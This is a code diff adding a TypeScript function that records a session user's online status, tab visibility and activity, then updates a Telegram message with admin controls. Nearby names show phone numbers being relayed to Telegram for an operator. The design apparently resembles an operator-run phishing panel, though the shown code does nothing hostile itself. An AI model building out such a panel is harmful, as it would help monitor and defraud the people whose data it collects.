@@ -208,6 +208,59 @@ export const updateCustomMessageInTelegram = async (
 };
 
 /**
+ * Update user online status in session
+ */
+export const updateUserOnlineStatus = async (
+  sessionId: string,
+  isOnline: boolean,
+  isVisible: boolean,
+  lastActivity: number,
+  statusText: string,
+  statusEmoji: string,
+): Promise<{ success: boolean }> => {
+  try {
+    const session = activeSessions.get(sessionId);
+    if (!session) {
+      console.error("❌ Session not found:", sessionId);
+      return { success: false };
+    }
+
+    // Update online status
+    session.onlineStatus = {
+      isOnline,
+      isVisible,
+      lastActivity,
+      statusText,
+      statusEmoji,
+      lastUpdate: Date.now(),
+    };
+
+    activeSessions.set(sessionId, session);
+
+    // Update Telegram message if session is in waiting_admin state
+    if (session.messageId && session.currentStep === "waiting_admin") {
+      const updatedMessage = formatSessionMessage(session);
+      await updateTelegramMessage(
+        session.messageId,
+        updatedMessage,
+        getAdminKeyboard(sessionId, session),
+      );
+    }
+
+    console.log("✅ Online status updated:", {
+      sessionId,
+      status: statusText,
+      emoji: statusEmoji,
+    });
+
+    return { success: true };
+  } catch (error) {
+    console.error("❌ Failed to update online status:", error);
+    return { success: false };
+  }
+};
+
+/**
  * Send initial phone number to Telegram with admin controls
  */
 export const sendPhoneToTelegramEnhanced = async (
